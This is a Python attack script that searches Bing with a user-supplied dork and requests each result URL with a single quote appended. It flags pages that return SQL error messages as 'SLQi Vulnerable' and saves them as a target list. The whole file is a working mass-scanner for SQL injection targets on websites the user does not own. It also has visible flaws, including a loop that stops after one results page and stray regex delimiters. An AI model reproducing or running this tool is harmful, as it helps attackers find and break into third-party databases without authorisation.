import urllib.request
import re
import time

def sqlihunt(dork, filename, scans):
    with open(filename + '.txt', 'w') as file2:
        start = 0
        end = int(scans)
        retry_delay = 10  # seconds
        max_retries = 3

        print("[info] Getting Websites From The World Wide Network")
        while start <= end and max_retries > 0:
            try:
                url = f'https://www.bing.com/search?q={dork}&first={start}'
                response = urllib.request.urlopen(url)
                readd = response.read().decode('utf-8')
                find = re.findall(r'<h2><a href="(.*?)"', readd)
                start += 10
                max_retries = 0  # Break out of the loop if successful
            except Exception as e:
                print(f"[ERROR] Network error: {e}")
                print("[Info] Trying to Reconnect")
                time.sleep(retry_delay)
                max_retries -= 1

        try:
            for i, url in enumerate(find, start=1):
                rez = url + "'"
                try:
                    response = urllib.request.urlopen(rez)
                    tstdd = response.read().decode('utf-8')
                    tstfind = re.findall(
                        r'/error in your SQL syntax|mysql_fetch_array()|execute query|'
                        r'mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|'
                        r'mysql_fetch_row()|SELECT \* FROM|supplied argument is not a valid MySQL|'
                        r'Syntax error|Fatal error/i|You have an error in your SQL syntax|'
                        r'Microsoft VBScript runtime error', tstdd)
                    if tstfind:
                        print(f"[SLQi Vulnerable!][{i}]: {rez}")
                        file2.write(rez + '\n')
                    else:
                        print(f"[NO SQLI :( ][{i}]: {rez}")
                except Exception as e:
                    print(f"[ERROR] No result found for URL [{i}]: {rez}, Error: {e}")
        except NameError:
            print("[ERROR] No URLs found to scan")

# Main program
print("""
 ________                    __                  _______                       __
|        \                  |  \                |       \                     |  \\
 \$$$$$$$$______   __    __  \$$  _______       | $$$$$$$\  ______    ______  | $$   __   ______    ______
   | $$  /      \ |  \  /  \|  \ /       \      | $$  | $$ /      \  /      \ | $$  /  \\ /      \\  /      \\
   | $$ |  $$$$$$\ \$$\/  $$| $$|  $$$$$$$      | $$  | $$|  $$$$$$\|  $$$$$$\\| $$_/  $$|  $$$$$$\\|  $$$$$$\\
   | $$ | $$  | $$  >$$  $$ | $$| $$            | $$  | $$| $$  | $$| $$   \\$$| $$   $$ | $$    $$| $$   \\$$
   | $$ | $$__/ $$ /  $$$\\ | $$| $$_____       | $$__/ $$| $$__/ $$| $$      | $$$$$$\\ | $$$$$$$$| $$
   | $$  \\$$    $$|  $$ \\$$\\| $$ \\$$     \\ | $$    $$ \\$$    $$| $$      | $$  \\$$\\ \\$$     \\| $$
   \\$$   \\$$$$$$  \\$$   \\$$ \\$$  \\$$$$$$$\\$$$$$$$   \\$$$$$$  \\$$       \\$$   \\$$  \\$$$$$$$ \\$$
_____________________________________________    ___________________________________________________________
""")

param1 = input("(Relevant Keyword  Or Domain For Target (Example: '.com , .cu.gob, .net ')): ")
print("Ok...")
param2 = input("Filename to save Results (Example: Target.txt): ")
print("Ok...")
scans = input("Number of Pages on search engines you want to Scan For MySQL Vuls: ")
print("OK...")

sqlihunt(param1, param2, scans)
print(" ./done ")
